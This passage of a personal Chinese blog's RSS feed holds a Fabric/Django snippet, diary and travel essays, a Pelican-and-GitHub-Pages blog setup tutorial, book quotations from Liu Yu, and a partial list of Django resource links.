&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fabric.api&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hosts&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cd&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fabric.contrib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;django&lt;/span&gt;

&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;project&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;myproject&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;myproject.myapp.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;MyModel&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;print_instances&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;instance&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;MyModel&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;instance&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@hosts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;production-server&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;print_production_instances&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/path/to/myproject&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;fab print_instances&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 05 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-05:learning fabric.html</guid><category>python</category></item><item><title>周记1</title><link>/weekly-diary-1.html</link><description>&lt;p&gt;我是个懒散惯了的人，厌恶过于正规或严肃的东西。尤其是装作严肃。  &lt;/p&gt;
&lt;p&gt;有时间的话，我大多用来看书或睡觉，很少能静下心来写些东西。&lt;/p&gt;
&lt;p&gt;当然也想养成写作的习惯，这样你就有可能站在生活的外边。等于你同时拥有两个生活，夸张点说，你赚到了另一个平行人生，其中一个你尽管沦陷在喜怒哀乐里，尽管去追逐,去表白,去拼搏,去痛哭。另一个你，只是安静地看着，不参与，不说话;那个你冷静，孤傲，不食人间烟火。&lt;/p&gt;
&lt;p&gt;我总是很羡慕能用心写作的人，他们一定也是很用心生活的。&lt;/p&gt;
&lt;p&gt;这样的人一定很有趣。&lt;/p&gt;
&lt;p&gt;我从小到大，受过最好的一句评价是“你真是个有趣的人”，为此我足足乐了三天。这也是我能想象到的对一个人最美妙的评价，近乎浪漫。&lt;/p&gt;
&lt;p&gt;我常常想不就是写作吗，牙一咬，心一横，坚持个三五天，就养成习惯了，之后就可以像播种之后的农夫，静静等待收获就行。&lt;/p&gt;
&lt;p&gt;如你所料，都没能坚持下来，总觉得写作不如胡思乱想有趣，觉得思路老是被束缚，正当奋力一跃，却不料翅膀张不开。我认真想了想，可能是我太把它当回事了，总想把话说得漂亮些，就像一个缺乏自信的人，穿着不合身的衣服，为的是看着体面。&lt;/p&gt;
&lt;p&gt;为了养成写作的习惯，我应当完全按照自己的喜好来写，素颜以对吧，这样它就成为一种真实的生活的方式了，而不是面具舞会。&lt;/p&gt;
&lt;p&gt;be myself。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 05 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-05:weekly-diary-1.html</guid><category>日记</category></item><item><title>泰山纪游</title><link>/%E6%B3%B0%E5%B1%B1%E7%BA%AA%E6%B8%B8.html</link><description>&lt;p&gt;十一上泰山看日出，还有比这更俗的出游计划么。&lt;br /&gt;
有的。  比方说十一逛故宫。&lt;br /&gt;
好吧，两件事我都干过。  &lt;/p&gt;
&lt;p&gt;车上乏善可陈，十一的高速堵得像军训结束时的食堂。&lt;br /&gt;
一怒之下，差点徒步去泰山。&lt;br /&gt;
到泰山脚下已近两点。&lt;br /&gt;
对的，正是半夜两点。&lt;br /&gt;
山东的空气质量甩河北远不只两条街。  舟车劳顿的我们一下车倒是清醒了不少 。&lt;br /&gt;
泰山很大。&lt;br /&gt;
这倒不是道听途说。你只须瞄一眼泰山脚下的人群，就可以轻易得出这个结论。&lt;br /&gt;
我们随便挑了根登山棍就上路了。&lt;br /&gt;
夜色很好，气氛也好。&lt;br /&gt;
你想啊，半夜三更，行走在荒山野岭，一开始你们随旅行团一道出发。走着走着，十个走成八个，再走就成六个，然后然后，走两步又有人落下。
你和同伴只有一个手电，对的，就是你的手机闪光灯，来之前你听去过泰山的小伙伴说一路有路灯，你手电都懒得带了，现在你 才   发    现！！！所谓路灯，
大约就是平均三公里出现一次的东西，有这样坑小伙伴的么。&lt;br /&gt;
你们前不着村，后不着店，继续荒山野岭着，时而拐角处还能蹦出个石像。。&lt;br /&gt;
够惊悚够刺激吧，你还带着妹子去看惊悚片?还期待她惊吓之余一把抱住你吗？情节太老土了，爱她就带她去泰山吧。 &lt;/p&gt;
&lt;p&gt;至于十八盘的陡峭，南天门的日出我就不人云亦云了。  一直不大喜欢目的性太强的出游，好比爬趟泰山非冲上山顶日出，去趟北京非上长城。好像路途都是煎熬似的，一个劲奔向山顶，多乏味。我喜欢走走停停,边走边看，峰回路转，深山里忽然冒出一家小店，是一定得定下来坐坐的，至于赶不赶得上日出倒是次要。  &lt;/p&gt;
&lt;p&gt;一路上对各类石头岩壁上的题字颇为烦感。&lt;br /&gt;
古人题刻痛山河。  那确也是一种壮美。
至于泰山景区里的大多题刻，除了炫耀身份和yy游客看到时流露仰慕的目光，我实在看不出其他.&lt;br /&gt;
内容不想多说，无非扯几句大好河山，说几句看似清高出尘的套话。&lt;br /&gt;
这和"某某某到此一游“的乱图乱划相比也高明不到哪去。&lt;br /&gt;
有的话，大约是州官放火和百姓点灯的区别吧。
想起叔本华把它归纳为“作用和反作用”，不觉哑然一笑，大快人心。  &lt;/p&gt;
&lt;p&gt;回去的车上在微信上聊起此行，抱怨这六千多阶的台阶，走得我欲仙欲死。&lt;br /&gt;
她倒嘲笑道：“你不是一贯以热爱游山玩水自居么，以后还是安心的玩水吧”&lt;/p&gt;
&lt;p&gt;好吧，下一个计划就江南吧&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 07 Oct 2013 00:00:00 +0000</pubDate><guid>tag:,2013-10-07:泰山纪游.html</guid><category>随笔</category></item><item><title>每天写些东西</title><link>/%E9%9A%8F%E7%AC%94.html</link><description>&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我积攒这种耐心的方式，是用感受来弥补事件的贫瘠。在一定程度上，我相信这不是渡过有意义人生的一种方式。它是渡过有意义人生的唯一方式。我相信是一个人感受的丰富性、而不是发生在他生活中的事件的密度，决定他生活的质地；是一个人的眼睛、而不是他眼前的景色，决定他生活的色彩
&amp;nbsp;&amp;nbsp;------------刘瑜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之前觉得pelican写东西并不算方便，于是三天打鱼两天晒网的。&lt;/p&gt;
&lt;p&gt;今天花了点时间为pelican写了个自动化脚本，以后专注于文字就行了，让git来帮我管理。&lt;/p&gt;
&lt;p&gt;其实很早之前就依赖于文字来储存生活了，我知道我大脑的内存很低很低，要是没有文字，就只能活在前不着村，后不着地的时空里。偶尔翻开之前记下的东西，时间如空间一般展开呈现在眼前。&lt;/p&gt;
&lt;p&gt;竟有在钱包丢后失而复得的感觉。&lt;/p&gt;
&lt;p&gt;每天睡前腾出一点时间，记录一下吧。&lt;/p&gt;
&lt;p&gt;就为我自己这零碎平凡，但对我而言有趣得很的生活。&lt;/p&gt;
&lt;p&gt;放小姐说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人生总有某一时刻，你说的你写的，是其他任何人、包括你自己，永远都无法再复制的。也许十四年后我回头看看现在写的这些，依旧会想起当时的幸福。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;刘瑜说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人生若有知己相伴固然妙不可言,但那可遇而不可求,真的,也许既不可遇又不可求,可求的只有你自己,你要俯下身去,朝着幽暗深处的自己伸出手去。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;大三以来渐是固执地相信万般皆下品，唯有读书高，人际关系就像刘瑜说得其实懒得经营了，交流是个多么困难的事，须占尽天时地利人和，你们有相似的知识品性，相似的空闲时间，还得处于相似的心境下。&lt;/p&gt;
&lt;p&gt;不如向深处的自己伸出手去。&lt;/p&gt;
&lt;p&gt;writing for myself&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 06 Oct 2013 00:00:00 +0000</pubDate><guid>tag:,2013-10-06:随笔.html</guid><category>日记</category></item><item><title>基于Pelican和github的静态博客搭建过程</title><link>/pelican.html</link><description>&lt;p&gt;前两天刚把博客搭好，如你所见，你所在的地方就是用&lt;code&gt;Pelican&lt;/code&gt;搭建的  &lt;br /&gt;
为何使用&lt;code&gt;github&lt;/code&gt;来搭建博客呢，&lt;a href="#todo"&gt;这里&lt;/a&gt;给出了理由 &lt;br /&gt;
Why not &lt;a href="#todo"&gt;Jekyll&lt;/a&gt;?  &lt;br /&gt;
Jekyll基于&lt;code&gt;ruby&lt;/code&gt;,Pelican基于&lt;code&gt;python&lt;/code&gt;，我更习惯python，如此而已 &lt;br /&gt;
使用Pelican之后，你只要用&lt;code&gt;markdown&lt;/code&gt;格式写日志，Pelican会把markdown转换成&lt;code&gt;html&lt;/code&gt;的格式，之后push到github pages上, 就可以看到你写的日志了，就是说你的所有工作就是用markdown写作，是不是很惬意^_^ &lt;br /&gt;
Pelican 的一些主要&lt;code&gt;特性&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python实现，开放源码&lt;/li&gt;
&lt;li&gt;输出静态页面，方便托管&lt;/li&gt;
&lt;li&gt;支持主题，采用Jajin2模板引擎&lt;/li&gt;
&lt;li&gt;支持代码语法高亮&lt;/li&gt;
&lt;li&gt;支持reStructuredText、Markdown、AsciiDoc格式&lt;/li&gt;
&lt;li&gt;支持Disqus评论&lt;/li&gt;
&lt;li&gt;支持Atom和RSS输出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;闲话不说，进入主题 &lt;br /&gt;
我假设你是初来乍到的小白.（我也是小白啦～）虽说是小白,搭建这种geek类博客并没有你想象的费劲。just do it   &lt;br /&gt;
首先，你得把git给入门了，入门简单，要掌握的命令不多，这是&lt;a href="#todo"&gt;git基本教程&lt;/a&gt;（虽说git的学习曲线很陡峭，基本用法还是很容易的，don't worry about it） 
我假设你掌握了基本的git命令，接着我们可以正式开始了 &lt;/p&gt;
&lt;h2&gt;安装linux系统&lt;/h2&gt;
&lt;p&gt;as a geek(或者渴望成为geek的小白）你还抱着win7不放么，还舍不得那熟悉的蓝屏么，还舍不得莫名其妙的报错么,果断抛弃娇气的windows，投入linux的怀抱吧。俺使用的发行版是Ubuntu12.04.一直很稳定且顺心  &lt;br /&gt;
你要执意使用window，之后可能在环境配置上得费些功夫，其他基本一样。
本文的环境是Ubuntu12.04。&lt;/p&gt;
&lt;h2&gt;安装Pelican&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install pelican
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;使用Markdown来写文章的话，还需要安装Markdown库&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install Markdown
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;创建blog目录：&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkdir myblog
cd myblog
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;创建一个博客：(在当前目录下，即myblog)&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pelican-quickstart
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;按照提示设置，可按默认的设置，之后可在pelicanconf.py文件中修改设置。&lt;/p&gt;
&lt;p&gt;以下是生成的目录结构：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;myblog/     
├── content              # 存放输入的源文件  
├── output               # 生成的输出文件  
├── develop_server.sh    # 方便开启测试服务器    
├── Makefile             # 方便管理博客的Makefile  
├── pelicanconf.py       # 主配置文件    
└── publishconf.py       # 发布时使用的配置文件
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;写一篇文章&lt;/h4&gt;
&lt;p&gt;以mardown格式举例，具体可以去看pelican的文档. 进入content目录，创建一个文件，写入博客内容：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2013&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt; &lt;span class="err"&gt;#日期&lt;/span&gt;

&lt;span class="n"&gt;Title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;test&lt;/span&gt; &lt;span class="err"&gt;＃标题&lt;/span&gt;

&lt;span class="n"&gt;Tags&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="n"&gt;pelican&lt;/span&gt; &lt;span class="n"&gt;github&lt;/span&gt; &lt;span class="err"&gt;#标签&lt;/span&gt;

&lt;span class="n"&gt;Category&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="err"&gt;#分类&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中Date和Title是必须的，其它的可以不写  &lt;br /&gt;
如果该文件位于content目录中某个子目录中时，如./content/python，那pelican就把这篇文章分类为子目录名python&lt;/p&gt;
&lt;h4&gt;生成html&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;make html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你将看到output文件夹里多了×××.html文件
在myblog所在的地方新建一个myblog_for_github（名字随意）,把output里的文件复制到里面。 &lt;br /&gt;
为何呢，下文解释&lt;/p&gt;
&lt;h2&gt;在github上创建GitHub Pages&lt;/h2&gt;
&lt;p&gt;新建一个Repository，Repository名字为yourname.github.com，yourname是您的用户ID。&lt;/p&gt;
&lt;p&gt;创建成功以后，便可以把生成的页面push到github。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd myblog_for_github
git init
git add .
git commit -m &amp;quot;first commit&amp;quot;
git remote add origin https://github.com/xxx/xxx.github.io.git
git push -u origin master
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;现在可以通过 xxx.github.io 或者 xxx.github.com 来访问您的博客了。&lt;/p&gt;
&lt;h2&gt;修改以及更新博客&lt;/h2&gt;
&lt;p&gt;看了几篇资料，里面似乎都没有谈到后续继续写博客的问题，当然这不属于搭建的问题&lt;br /&gt;
顺带也提一下吧，做个备忘。 &lt;br /&gt;
当我们隔了几天继续写博客时，把写好的×××.md文件放到content文件夹里输入：&lt;br /&gt;
    make html
之所以要把内容复制到myblog_for_github里再提交，是因为每次执行 
    make html
output里的文件会被覆盖，不能在这里git init，否则仓库会被删了 &lt;br /&gt;
至于增删改已经提交的博客的内容基本是git的任务，也就是本教程之初让你去入门git的原因  &lt;br /&gt;
会用到的一些指令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git rm ×××.html    //删除代码库中文件
git add . 
git commit -m &amp;quot;some message&amp;quot;
git push -u origin master
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;域名绑定&lt;/h2&gt;
&lt;p&gt;在repo的根目录下面，新建一个名为CNAME的文本文件，里面写入你要绑定的域名，比如顶级域名 example.com 或者二级域名 xxx.example.com。&lt;/p&gt;
&lt;p&gt;遇到问题请谷歌,或者查看官方文档&lt;/p&gt;
&lt;p&gt;参考资料:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#todo"&gt;用pelican在github上创建博客极简教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://readthedocs.org/docs/pelican/en/2.8/"&gt;Pelican官方文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#todo"&gt;用 Pelican 和 GitHub Pages 搭建免费的个人博客&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 09 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-09:pelican.html</guid><category>python</category></item><item><title>送你一颗子弹</title><link>/book-song.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;***摘自刘瑜《送你一颗子弹》&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我其实并不孤僻，简直可以说开朗活泼，但大多时候我很懒，懒得经营一个关系，还有一些时候，就是爱自由，觉得任何一种关系都会束缚自己。当然最主要的，还是知音难觅。我老觉得跟大多数人交往，总是只能拿出自己的一个维度，很难找到和自己一样兴趣一望无际的人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;以前一个朋友写过一首诗，叫《一个人要像一支队伍》。我想象文革中的顾准、狱中的杨小凯，在文学圈之外写作的王小波，就是这样的人。怀才不遇，逆水行舟，一个人就像一支队伍，对着自己的头脑和心灵招兵买马，不气馁，有召唤，爱自由。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那些与你毫无关系的人，就是毫无关系，就算笑得甜蜜，就算有过无关痛痒的来往，就算你努力经营这段关系。那些与你有关系的，就是与你有关系，就算你们只见过三次，就算你们三年才搭理一侧,就算你想不起他的样子,就算你们隔着十万八千里.有些人注定是你生命里的癌症,而有些人只是一个喷嚏而已&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;15岁的时候再得到那个5岁的时候热爱的洋娃娃，65岁的时候终于有钱买25岁的时候热爱的那条裙子，又有什么意义呢？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么勇气的问题总是被误以为是时间的问题，而那些沉重、抑郁的、不得已的，总是被叫做生活本身。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我想象爱上一个人，就像出门的时候被闪电袭击一样，虽然概率很小，但你是一点办法都没有的。它就这么发生了，你就这么被点着了，然后也就这么变成了一堆灰烬。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果要给美好的人生一个定义，那就是惬意。如果要给惬意一个定义，那就是三五知己，谈笑风生。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我想大学精神的本质，并不是为了让我们变得深奥，而恰恰是恢复人类的天真。天真的人，才会无穷无尽地追问关于这个世界的道理。大学要造就的，正是这种追问的精神，也就是那些“成熟的人”不屑一顾的“呆子气”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人生若有知己相伴固然妙不可言，但那可遇不可求，真的，也许既不可遇也不可求，可求的只有你自己，你要俯下身去，朝着幽暗深处的自己伸出手去。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;全世界都在追逐着梦想，查尔斯却在追逐他的噩运。好吧，这两件事其实没那么不同，被梦想俘虏的人就是在追逐自己的噩运。……15年之内，这个伦敦的股票交易员风驰电掣，越过城市，越过文明，越过中产阶级，越过太平洋，越过人性，终于追上了命运这匹烈马。……满地都是六便士，他却抬头看见了月亮。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对有志青年来说，发疯是多么灿烂的事情简直是义不容辞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从什么时候开始，学习成了一种现代生活的强迫症了呢，人人都赶着看急诊。我们与社会的关系，多么像一个没有安全感的女人和一个魅力四射的丈夫的关系。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;是一个人感受的丰富性、而不是发生在他生活中的事件的密度，决定他生活的质地，是一个人的眼睛、而不是他眼前的景色，决定他生活的色彩。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;功夫常常是会负有心人的；功夫负不负有心人本该没有那么重要的，“有心”的价值是不能用“负不负”来衡量的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;幸福其实往往比我们所想象的要简单很多，问题在于如果我们不把所有复杂的不幸都给探索经历一边，不把所有该摔的跤都摔一遍，不把所有的山都给爬一遍，我们就没法相信其实山脚下的那块巴掌大的树荫下就有幸福。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-08:book-song.html</guid><category>刘瑜</category></item><item><title>余欢</title><link>/book-yu.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;摘自刘瑜《余欢》&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;***&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;也许，我喜欢你，就是因为你是我认识的人中，唯一不可归类的人。唯一不需要任何形式的“集体主义”的人。唯一不被流行的情绪传染得感冒了的人。他们恐惧孤独，所以需要一个圈子。但你就在你自己的角落里，远远地，雕刻你自己的时光。而我，就这样远远地眷恋你。我可怜吗？我还觉得我可喜可贺呢。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;waiting...&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-08:book-yu.html</guid><category>刘瑜</category></item><item><title>django的一些资源链接</title><link>/django-links.html</link><description>&lt;h3&gt;使用django的过程里搜集的一些资源，做个总结：&lt;/h3&gt;
&lt;h3&gt;教程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.djangobook.com/en/2.0/index.html"&gt;The Django Book&lt;/a&gt;   djangobook：很好的入门教材，&lt;code&gt;易懂且丰富&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://djangobook.py3k.cn/2.0/"&gt;The Django Book中文版&lt;/a&gt;： 目前是&lt;code&gt;1.1&lt;/code&gt;版,英文版更新到&lt;code&gt;1.4&lt;/code&gt;，django.1.4新特性可参考&lt;a href="http://www.douban.com/group/topic/27110461/"&gt;这里&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.djangoproject.com/"&gt;官方文档&lt;/a&gt;  涵盖django的方方面面，遇到的问题基本能在这里面找到答案，ps:只有&lt;code&gt;英文版&lt;/code&gt;的，见过一些号称中文版的，翻译得多是虎头蛇尾，这份文档确实够厚，好在读起来并不算费力～ &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/holbrook/archive/2012/02/10/2357343.html"&gt;django实战&lt;/a&gt;(迭代出购物车 ) ： 一个项目示例,是&lt;code&gt;Depot&lt;/code&gt;的django实现（ Depot是《Agile Web Develeopment with Rails》中的一个应用，使许多人走上Rails开发的道路），&lt;code&gt;django实战&lt;/code&gt;是我见过的国内django教程里做得最认真也最好的，最初来自ThinkInside的blog，他把博客迁移到github上了,&lt;a href="http://thinkinside.tk/"&gt;here&lt;/a&gt;。该教程用迭代的方法循序渐进地引导初学者，内容很丰富&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github上一些django资源:&lt;/h3&gt;
&lt;p&gt;github是个巨大的宝库，下面是我的一些推荐(有些和&lt;code&gt;django资源汇总&lt;/code&gt;里重复，不过以下基本都是我自己用过的，各位如果在使用过程遇到问题，欢迎一起交流，my email:&lt;code&gt;wuwenjie718@gmail.com&lt;/code&gt;)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/pinax/pinax"&gt;pinax&lt;/a&gt;  可以把它当作一个&lt;code&gt;脚手架&lt;/code&gt;，Pinax包含了近43个Apps，有Tagging、Blog、Profiles、OpenID、Messages、Gravatar……大多数常用的Web技术和应用都有提供，你，值得拥有&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/divio/django-cms"&gt;django-cms&lt;/a&gt; 目前开源Django CMS中功能最为完善的一个&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/toastdriven/django-tastypie"&gt;django-tastypie&lt;/a&gt;:django的RESTful框架，github上很热&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/omab/django-social-auth"&gt;django-social-auth&lt;/a&gt; 第三方登录&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tomchristie/django-rest-framework"&gt;django-rest-framework&lt;/a&gt; django的RESTful框架，ThinkInside在&lt;a href="http://www.cnblogs.com/holbrook/archive/2012/02/10/2357343.html"&gt;django实战&lt;/a&gt;中推荐，我目前用的就是这个&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lukaszb/django-guardian"&gt;django-guardian&lt;/a&gt;对user权限进行更细致的控制&lt;/li&gt;
